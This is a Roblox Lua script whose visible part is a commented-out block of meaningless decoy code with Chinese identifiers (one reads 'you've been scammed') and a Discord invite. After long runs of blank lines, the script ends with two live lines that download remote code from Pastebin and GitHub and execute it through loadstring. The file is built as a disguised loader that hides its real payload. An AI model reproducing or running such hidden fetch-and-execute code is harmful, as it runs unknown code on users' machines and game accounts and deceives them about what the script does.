--[[
SCRIPT discord.gg/ZHBevg8FyR
local 你被骗了 = function(加密, 混淆)
    local 隐藏表 = {加密 = 混淆, 混淆 = 加密}
    return function(...)
        local 假数据 = {...}
        for 计数 = 1, #假数据 do
            隐藏表[计数] = (假数据[计数] or 0xCAFEBABE) ^ (隐藏表.混淆 or 0xDEAD)
        end
        return 隐藏表
    end
end

local 伪装核心 = 你被骗了(math.floor(math.random() * 0xBEEF), 0xF00D)
local 影子迷雾 = setmetatable({}, {__index = function(_, 键) return 键 * 0xBADC0DE end})

local function 欺骗矩阵()
    local 虚构值 = 伪装核心(影子迷雾[1], nil, math.pi)
    for _, 假值 in ipairs(虚构值) do
        if 假值 == 影子迷雾[假值] then
            假值 = (假值 * 0x1337) % 0xFFFF
        end
    end
    return function() return 虚构值 end
end

game:GetService("RunService").Heartbeat:Connect(function()
    local 空结果 = 欺骗矩阵()()
    for _, 垃圾 in pairs(空结果) do
        垃圾 = 垃圾 + (game.Players.LocalPlayer.Character and 0 or 1)
    end
end)















































]]






























































loadstring(game:HttpGet("https://pastebin.com/raw/RHFERcLi"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Steal-a-Brianrot/refs/heads/main/ArbixHubBEST.lua"))()
